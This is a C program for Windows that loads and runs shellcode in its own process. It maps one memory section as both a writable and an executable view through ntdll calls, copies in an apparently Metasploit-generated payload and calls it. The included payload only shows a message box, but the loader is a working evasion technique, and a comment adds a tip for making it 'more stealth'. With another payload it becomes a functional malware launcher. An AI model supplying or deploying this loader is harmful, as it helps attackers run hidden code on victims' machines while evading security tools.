#include <stdio.h>
#include <windows.h>

typedef NTSTATUS(NTAPI* d_NtCreateSection)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, void*, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributes, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
typedef NTSTATUS(NTAPI* d_NtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef NTSTATUS(NTAPI* d_NtUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);

int main(){
    //messagebox
    unsigned char buf[] = 
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
    "\x8d\x8d\x2a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
    "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
    "\x00\x3e\x4c\x8d\x85\x1f\x01\x00\x00\x48\x31\xc9\x41\xba"
    "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
    "\x56\xff\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
    "\x20\x4d\x53\x46\x21\x00\x4d\x65\x73\x73\x61\x67\x65\x42"
    "\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

    d_NtCreateSection fNtCreateSection = (d_NtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
    d_NtMapViewOfSection fNtMapViewOfSection = (d_NtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
    d_NtUnmapViewOfSection fNtUnmapViewOfSection = (d_NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
    SIZE_T size = 4096;
    LARGE_INTEGER sectionSize = { size };
    HANDLE sectionHandle = NULL;
    PVOID rwa = NULL;
    PVOID rxa = NULL;
    fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &rwa, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &rxa, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
    memcpy(rwa, buf, sizeof(buf));
    //you can uncomment this if you want to lose write access, makes more stealth
    //fNtUnmapViewOfSection(GetCurrentProcess(), rwa);
    printf("%p %p\n", rwa, rxa);
    ((void(*)())rxa)();
    return 0;
}
